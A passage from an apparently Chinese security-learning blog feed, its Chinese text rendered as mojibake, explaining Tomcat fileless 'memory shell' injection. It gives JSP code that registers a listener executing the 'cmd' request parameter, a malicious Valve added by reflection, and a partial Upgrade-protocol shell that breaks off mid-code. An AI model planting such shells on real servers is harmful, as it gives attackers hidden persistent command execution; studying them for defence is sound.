applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//åˆ›å»ºæ¶æ„listener</span><br>    <span class="hljs-type">ServletRequestListener</span> <span class="hljs-variable">servletRequestListener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRequestListener</span>()&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br><br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">//æ·»åŠ ç›‘å¬å™¨</span><br>    standardContext.addApplicationEventListener(servletRequestListener);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>ç„¶åç¾ç¾ç™½å±å¼¹è®¡ç®—å™¨</p><p><img src="https://cdn.clown2024.cn/202409191342329.png" alt="image-20240919134253239"></p><p><img src="https://cdn.clown2024.cn/202409191342142.png" alt="image-20240919134258008"></p><blockquote><p>è¿™é‡Œæˆ‘è®¤ä¸ºæ˜¯å¹¶æ²¡æœ‰ç›¸å…³è·¯å¾„çš„åŒ¹é…é€»è¾‘ï¼Œæ‰€ä»¥ä¸éœ€è¦åœ¨è®¿é—®å‰çš„é‚£éƒ¨åˆ†æ³¨å†Œ</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™é‡Œæ˜¯æœ¬èœé¸¡å¼€å§‹å­¦ä¹ å†…å­˜é©¬çš„èµ·å§‹æ–‡ç« &lt;/p&gt;
&lt;p&gt;æœ‰å…³å†…å­˜é©¬çš„è®¤çŸ¥å¯ä»¥çœ‹çœ‹su18å¸ˆå‚…çš„è¿™ç¯‡æ–‡ç« ï¼š&lt;a href=&quot;https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ&quot;&gt;https://mp.weixin.qq.com/s/</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="å†…å­˜é©¬" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Tomcatä¸­é—´ä»¶å†…å­˜é©¬</title>
    <link href="https://clowsman.github.io/2024/09/14/Tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>https://clowsman.github.io/2024/09/14/Tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2024-09-14T12:54:29.000Z</published>
    <updated>2024-09-27T14:53:07.569Z</updated>
    
    <content type="html"><![CDATA[<p>å…¶å®å‰é¢çš„ä¼ ç»Ÿwebåº”ç”¨å†…å­˜é©¬ä¹Ÿæ˜¯tomcatè¿™éƒ¨åˆ†çš„ï¼Œå› ä¸ºå®ƒåŸºäºtomcatè¿›è¡Œåˆ†æä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œåˆ«çš„ä¸­é—´ä»¶åº”è¯¥ä¹Ÿæ˜¯æœ‰è¿™äº›åŸºæœ¬ç»„ä»¶çš„ã€‚</p><h1 id="tomcat-valveå†…å­˜é©¬"><a href="#Tomcat-Valveå†…å­˜é©¬" class="headerlink" title="Tomcat-Valveå†…å­˜é©¬"></a>Tomcat-Valveå†…å­˜é©¬</h1><p>valveå°±æ˜¯å‰é¢æ–‡ç« ä¸­è¯´è¿‡çš„é˜€é—¨ï¼Œä¹Ÿå°±æ˜¯pipeline(ç®¡é“)æœºåˆ¶ï¼Œæƒ³äº†è§£å¾—æ›´åŠ ç»†è‡´ä¸€ç‚¹å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%89%8D%E6%96%87%E6%8F%90%E5%88%B0%E7%9A%84%E6%80%BB%E7%BB%93%E5%A4%A7%E5%85%A8%E6%96%87%E7%AB%A0%E3%80%82">https://www.cnblogs.com/coldridgeValley/p/5816414.htmlï¼Œä¹Ÿå¯ä»¥çœ‹å‰æ–‡æåˆ°çš„æ€»ç»“å¤§å…¨æ–‡ç« ã€‚</a></p><p>è¿™é‡Œæ”¾ä¸€å¼ Valveçš„è¿è¡Œæœºåˆ¶å›¾</p><p><img src="https://cdn.clown2024.cn/202409211418602.png" alt="image-20240921141822546"></p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>ç»è¿‡å‰é¢çš„å­¦ä¹ ï¼Œç°åœ¨åˆ†æèµ·æ¥è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œè¿™é‡Œå°±ä¸è‡ªå·±é…ä¸€ä¸ªvalveäº†ï¼Œå› ä¸ºvalveå±äºå®¹å™¨ï¼Œéœ€è¦åœ¨server.xmlæˆ–è€…context.xmlé‚£é‡Œé…ç½®ï¼Œçœ‹çœ‹æ–‡ç« å°±è¡Œï¼Œæˆ–è€…åƒæ–‡ç« é‡Œç›´æ¥ç”¨springbootæ¥æ­å»ºã€‚</p><blockquote><p>Pipelineå®šä¹‰å¯¹åº”çš„æ¥å£æ˜¯Pipelineï¼Œä»–çš„å®ç°ç±»æ˜¯StandardPipelineï¼ŒValveå®šä¹‰å¯¹åº”æ¥å£Valveï¼Œä»–çš„æŠ½è±¡å®ç°ç±»æ˜¯ValveBaseï¼Œç„¶åå››ä¸ªå®¹å™¨æœ¬èº«æœ‰çš„é˜€é—¨ä¸ºStandardEngineValveï¼ŒStandardHostValveï¼ŒStandardContextValveï¼ŒStandardWrapperValveã€‚</p></blockquote><p>è¿™é‡Œç›´æ¥çœ‹æºç åˆ†æ</p><p><img src="https://cdn.clown2024.cn/202409211514128.png" alt="image-20240921151457990"></p><p>æˆ‘ä»¬åœ¨è®¿é—®filterçš„æ—¶å€™å¯ä»¥ä»è°ƒç”¨æ ˆçœ‹åˆ°å¾ˆå¤šçš„valveï¼Œæˆ‘ä»¬å¯ä»¥å»çœ‹ä¸€ä¸‹è¿™äº›wrapperValve</p><p><img src="https://cdn.clown2024.cn/202409211518432.png" alt="image-20240921151844389"></p><p>å¯ä»¥çœ‹åˆ°ç»§æ‰¿çš„æ˜¯ValveBaseè¿™ä¸ªç±»ï¼Œè¿™ä¸ªç±»æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œç„¶åå®ƒåˆå®ç°äº†Valveæ¥å£ï¼Œçœ‹ä¸€ä¸‹Valveæ¥å£æœ‰ä»€ä¹ˆï¼Œç›´æ¥copyä¸€ä¸‹æ–‡ç« çš„å†…å®¹ï¼Œå› ä¸ºä»–åŠ äº†æ³¨é‡Š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.catalina;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Request;<br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Response;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Valve</span> &#123;<br>    <span class="hljs-comment">// è·å–ä¸‹ä¸€ä¸ªé˜€é—¨</span><br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span>;<br>    <span class="hljs-comment">// è®¾ç½®ä¸‹ä¸€ä¸ªé˜€é—¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span>;<br>    <span class="hljs-comment">// åå°æ‰§è¡Œé€»è¾‘ï¼Œä¸»è¦åœ¨ç±»åŠ è½½ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨åˆ°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span>;<br>    <span class="hljs-comment">// æ‰§è¡Œä¸šåŠ¡é€»è¾‘</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><br>        <span class="hljs-keyword">throws</span> IOException, ServletException;<br>    <span class="hljs-comment">// æ˜¯å¦å¼‚æ­¥æ‰§è¡Œ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹æ¯ä¸€çº§çš„Valveæ˜¯æ€ä¹ˆè°ƒç”¨çš„</p><p><img src="https://cdn.clown2024.cn/202409211533484.png" alt="image-20240921153326414"></p><p>åœ¨Hostè°ƒç”¨Contextçš„</p><p><img src="https://cdn.clown2024.cn/202409211533055.png" alt="image-20240921153355996"></p><p>åœ¨Contextè°ƒç”¨Wrapperçš„</p><p>ç„¶åæˆ‘ä»¬é‡æ–°ä¸‹æ–­ç‚¹ä»context.getPipelineå¼€å§‹çœ‹ï¼Œåˆ©ç”¨ç‚¹ä»è¿™é‡Œå¼€å§‹ï¼Œå› ä¸ºæˆ‘ä»¬å¥½è·å–çš„å°±æ˜¯context</p><p><img src="https://cdn.clown2024.cn/202409211538211.png" alt="image-20240921153810150"></p><p>è¿™é‡Œä¼šèµ°åˆ°çˆ¶ç±»çš„ContainerBaseçš„getPipelineæ–¹æ³•ï¼ŒContainerBaseæ˜¯æ‰€æœ‰å®¹å™¨çš„æŠ½è±¡çˆ¶ç±»</p><p><img src="https://cdn.clown2024.cn/202409211539334.png" alt="image-20240921153916289"></p><p>ç„¶åæˆ‘ä»¬å»çœ‹çœ‹è¿™ä¸ªpipeline</p><p><img src="https://cdn.clown2024.cn/202409211540918.png" alt="image-20240921154014879"></p><p>æ˜¯ä¸€ä¸ªStandardPipelineç±»ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´è¿‡çš„Pipelineçš„å®ç°ç±»</p><p><img src="https://cdn.clown2024.cn/202409211541679.png" alt="image-20240921154104632"></p><p>çœ‹çœ‹Pipelineçš„æ¥å£æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409211541979.png" alt="image-20240921154142926"></p><p>å¯ä»¥çœ‹åˆ°æœ‰addVavleæ–¹æ³•ï¼Œé‚£ä¹ˆStandardPipelineå°±æœ‰ç›¸åº”çš„å®ç°æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409211543271.png" alt="image-20240921154312200"></p><p>é‚£æˆ‘ä»¬æ‰“å†…å­˜é©¬çš„æ€è·¯å°±å‡ºæ¥äº†</p><p>æˆ‘ä»¬åªéœ€è¦åˆ©ç”¨context.getPipelineç„¶åaddVavleè¿›å»ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±å†™çš„æ¶æ„valveå³å¯</p><h2 id="å†…å­˜é©¬ç¼–å†™"><a href="#å†…å­˜é©¬ç¼–å†™" class="headerlink" title="å†…å­˜é©¬ç¼–å†™"></a>å†…å­˜é©¬ç¼–å†™</h2><p>exp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Valve&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//1.è·å–standardContext</span><br>    <span class="hljs-comment">//è·å–ApplicationContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>    <span class="hljs-comment">//è·å–StandardContext</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//è·å–Pipeline</span><br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> standardContext.getPipeline();<br>    <span class="hljs-comment">//æ·»åŠ æ¶æ„Valve</span><br>    pipeline.addValve(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Valve</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-comment">//æ¶æ„ä»£ç </span><br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>ç„¶åå°±èƒ½ç™½å±å¼¹è®¡ç®—å™¨</p><p><img src="https://cdn.clown2024.cn/202409211550418.png" alt="image-20240921155025355"></p><p><img src="https://cdn.clown2024.cn/202409211550385.png" alt="image-20240921155045287"></p><p>åœ¨è¿™ç¯‡æ–‡ç« çœ‹åˆ°ä¸€ä¸ªæ›´ç®€å•çš„è·å–standardContextçš„æ–¹æ³•ï¼š<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// æ›´ç®€å•çš„æ–¹æ³• è·å–StandardContext  </span><br> <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);  <br> reqF.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);  <br> <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext(); <br></code></pre></td></tr></table></figure><h1 id="tomcat-upgradeå†…å­˜é©¬"><a href="#Tomcat-Upgradeå†…å­˜é©¬" class="headerlink" title="Tomcat-Upgradeå†…å­˜é©¬"></a>Tomcat-Upgradeå†…å­˜é©¬</h1><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ-1" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>è¿™é‡Œå‚è€ƒæ–‡ç« ï¼š<a href="https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw">https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw</a></p><p>æ”¾ä¸€å¼ æ–‡ç« çš„è¿æ¥å™¨å›¾</p><p><img src="https://cdn.clown2024.cn/202409222103688.webp" alt="å›¾ç‰‡"></p><p>è¯¥å†…å­˜é©¬å°±æ˜¯åœ¨åˆ°è¾¾Containerä¹‹å‰çš„åˆ©ç”¨ï¼Œå› ä¸ºå¯èƒ½ä¼šç”±äºFilterçš„è¿‡æ»¤æˆ–è€…åä»£å¯¼è‡´æˆ‘ä»¬æ‰¾ä¸åˆ°è·¯å¾„ï¼Œå¯¼è‡´æˆ‘ä»¬çš„åˆ©ç”¨Containerå†…ç»„ä»¶çš„å†…å­˜é©¬æ— æ³•ä½¿ç”¨</p><p>é¦–å…ˆæŠ½è±¡ç±»<strong>AbstractProcessorLight</strong>çš„processæ–¹æ³•ä¸­ï¼Œä¼šæ ¹æ®å½“å‰<code>SocketWrapperBase</code>çš„çŠ¶æ€è¿›è¡Œå“åº”ï¼Œåœ¨<code>OPEN_READ</code>çŠ¶æ€æ—¶ï¼Œä¼šè°ƒç”¨å¯¹åº”çš„<code>Processor</code>çš„serviceæ–¹æ³•è¿›è¡Œå¤„ç†</p><p><img src="https://cdn.clown2024.cn/202409222122170.png" alt="image-20240922212210064"></p><p>è¿™é‡ŒHttpè¯·æ±‚è°ƒç”¨çš„å°±æ˜¯Http11Processor#serviceï¼Œç„¶åå®ƒé‡Œé¢æœ‰å¤„ç†Upgradeçš„é€»è¾‘</p><p><img src="https://cdn.clown2024.cn/202409222127551.png" alt="image-20240922212744457"></p><p>è¿™é‡Œçš„protocolæ˜¯Http11NioProtocolï¼Œçœ‹ä¸€ä¸‹ä»–çš„getUpgradeProtocolæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409222129320.png" alt="image-20240922212924262"></p><p>è¿™é‡Œèµ°åˆ°çš„æ˜¯çˆ¶ç±»çš„æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°å°±æ˜¯è¿”å›ä¸€ä¸ªUpgradeProtocolï¼ŒhttUpgradeProtocolsæ˜¯ä¸€ä¸ªhashMapï¼›è·å–äº†upgradeProtocolä¹‹åï¼Œå®ƒä¸‹é¢è¿˜è°ƒç”¨äº†ä»–çš„acceptæ–¹æ³•</p><p>æ¬¸é‚£è¿™é‡Œå†…å­˜é©¬çš„æ€è·¯å°±å‡ºæ¥äº†ï¼Œå’Œä¹‹å‰çš„ä¹Ÿå¾ˆç±»ä¼¼</p><p>é¦–å…ˆè¿™ä¸ªUpgradeProtocolæ˜¯ä¸€ä¸ªæ¥å£</p><p><img src="https://cdn.clown2024.cn/202409222140816.png" alt="image-20240922214008767"></p><p>é‚£ä¹ˆæˆ‘ä»¬åªè¦æ„é€ ä¸€ä¸ªæ¶æ„çš„UpgradeProtocolçš„å®ç°ç±»ï¼Œæ·»åŠ è¿›æˆ‘ä»¬å‰é¢çš„æåˆ°çš„httpUpgradeProtocolsé‡Œé¢å³å¯</p><p>é‚£ä¹ˆç°åœ¨å°±æ˜¯è¦æ‰¾è¿™ä¸ªhttpUpgradeProtocolsæ€ä¹ˆè·å–ï¼Œè¿™é‡Œå…ˆè·Ÿæ–‡ç« çœ‹çœ‹httpUpgradeProtocolsæ˜¯å“ªé‡Œè¢«èµ‹å€¼çš„</p><p><img src="https://cdn.clown2024.cn/202409222144324.png" alt="image-20240922214420260"></p><p>åœ¨AbstractHttp11Protocol#initæ–¹æ³•é‡Œé¢å¯¹upgradeProtocolsè¿›è¡Œäº†éå†ï¼Œç„¶åè°ƒç”¨äº†configureUpgradeProtocolæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409222146364.png" alt="image-20240922214605304"></p><p>ç„¶åè¯¥æ–¹æ³•upgradeProtocolæ·»åŠ åˆ°hashMapä¸­</p><blockquote><p>upgradeProtocolsæ˜¯åœ¨tomcatå¯åŠ¨çš„æ—¶å€™è¿›è¡Œåˆå§‹åŒ–</p></blockquote><h2 id="å†…å­˜é©¬ç¼–å†™"><a href="#å†…å­˜é©¬ç¼–å†™-1" class="headerlink" title="å†…å­˜é©¬ç¼–å†™"></a>å†…å­˜é©¬ç¼–å†™</h2><p>ç¬¬ä¸€æ­¥å…ˆæ‰¾åˆ°Http11NioProtocolï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<strong>request.request.connector.protocolHandler</strong>ä¸­æ‰¾åˆ°</p><p><img src="https://cdn.clown2024.cn/202409222151834.png" alt="image-20240922215129782"></p><p><img src="https://cdn.clown2024.cn/202409222151796.png" alt="image-20240922215134740"></p><p>ç„¶åhttpUpgradeProtocolså±æ€§å°±åœ¨é‡Œé¢ï¼Œæˆ‘ä»¬éœ€è¦ç”¨åå°„å»è·å–ï¼Œæˆ‘çœ‹äº†ä¸€ä¸‹æ²¡æœ‰ç›´æ¥getçš„æ–¹æ³•</p><p>ç¬¬äºŒæ­¥å°±æ˜¯ç¼–å†™æ¶æ„çš„UpgradeProtocoläº†</p><p><strong>exp</strong></p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Connector&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.http11.AbstractHttp11Protocol&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.UpgradeProtocol&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.HashMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.Processor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.net.SocketWrapperBase&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.Adapter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//1.åå°„è·å–httpUpgradeProtocols</span><br>    <span class="hljs-type">RequestFacade</span> <span class="hljs-variable">rf</span> <span class="hljs-operator">=</span> (RequestFacade) request;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">requestField</span> <span class="hljs-operator">=</span> RequestFacade.class.getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    requestField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">request1</span> <span class="hljs-operator">=</span> (Request) requestField.get(rf);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">connector</span> <span class="hljs-operator">=</span> Request.class.getDeclaredField(<span class="hljs-string">&quot;connector&quot;</span>);<br>    connector.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Connector</span> <span class="hljs-variable">realConnector</span> <span class="hljs-operator">=</span> (Connector) connector.get(request1);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">protocolHandlerField</span> <span class="hljs-operator">=</span> Connector.class.getDeclaredField(<span class="hljs-string">&quot;protocolHandler&quot;</span>);<br>    protocolHandlerField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">AbstractHttp11Protocol</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);<br><br>    HashMap&lt;String, UpgradeProtocol&gt; upgradeProtocols = <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">upgradeProtocolsField</span> <span class="hljs-operator">=</span> AbstractHttp11Protocol.class.getDeclaredField(<span class="hljs-string">&quot;httpUpgradeProtocols&quot;</span>);<br>    upgradeProtocolsField.setAccessible(<span class="hljs-literal">true</span>);<br>    upgradeProtocols = (HashMap&lt;String, UpgradeProtocol&gt;) upgradeProtocolsField.get(handler);<br>    <span class="hljs-comment">//2.æ„é€ æ¶æ„çš„UpgradeProtocol</span><br>    <span class="hljs-type">UpgradeProtocol</span> <span class="hljs-variable">upgradeProtocol</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpgradeProtocol</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getHttpUpgradeName</span><span class="hljs-params">(<span class="hljs-type">boolean</span> isSSLEnabled)</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getAlpnIdentifier() &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getAlpnName</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Processor <span class="hljs-title function_">getProcessor</span><span 